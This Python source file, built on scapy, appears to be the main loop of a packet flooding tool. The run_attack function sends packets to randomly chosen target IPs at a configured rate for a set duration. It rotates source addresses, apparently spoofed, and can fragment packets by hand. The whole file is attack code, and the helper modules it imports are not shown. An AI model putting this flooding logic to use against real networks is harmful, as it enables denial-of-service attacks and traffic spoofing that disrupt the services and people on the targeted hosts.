import random
import time

from scapy.all import fragment, send  # type: ignore

try:
    from .attack_config import AttackConfig
    from .packet_factory import build_packet, choose_protocol
    from .source_rotation import SourceRotator
except ImportError:
    from attack_config import AttackConfig
    from packet_factory import build_packet, choose_protocol
    from source_rotation import SourceRotator


def send_packet(packet, fragment_mode: str, fragsize: int) -> None:
    if fragment_mode == "manual":
        send(fragment(packet, fragsize=fragsize), verbose=False)
        return

    send(packet, verbose=False)


def run_attack(config: AttackConfig) -> None:
    source_rotator = SourceRotator(config.src_ips, config.src_rotation_interval)
    sleep_interval = 1.0 / config.pps
    end_time = time.time() + config.duration

    while time.time() < end_time:
        packet = build_packet(
            src_ip=source_rotator.get(),
            dst_ip=random.choice(config.dst_ips),
            protocol=choose_protocol(config.protocol),
            config=config,
        )
        send_packet(packet, config.fragment_mode, config.fragsize)
        time.sleep(sleep_interval)
